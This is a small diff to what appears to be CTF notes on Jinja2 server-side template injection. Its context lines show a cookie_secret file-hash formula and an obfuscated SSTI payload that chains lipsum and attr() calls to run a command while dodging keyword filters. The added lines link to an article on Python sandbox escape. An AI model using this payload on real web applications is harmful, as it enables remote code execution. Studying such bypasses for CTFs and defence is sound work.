@@ -188,3 +188,6 @@ filehash: md5(cookie_secret+md5(filename))
 {%set fuck=(lipsum|attr(fza2))|attr(fza5)(fza3)|attr(fza4)(command)|attr(re)()%}
 {%print fuck%}
 ```
+
+## Article
+[Python沙箱逃逸-离线也有](https://mp.weixin.qq.com/s/_cYKlPzUgokvJ17ZVRhMxw)
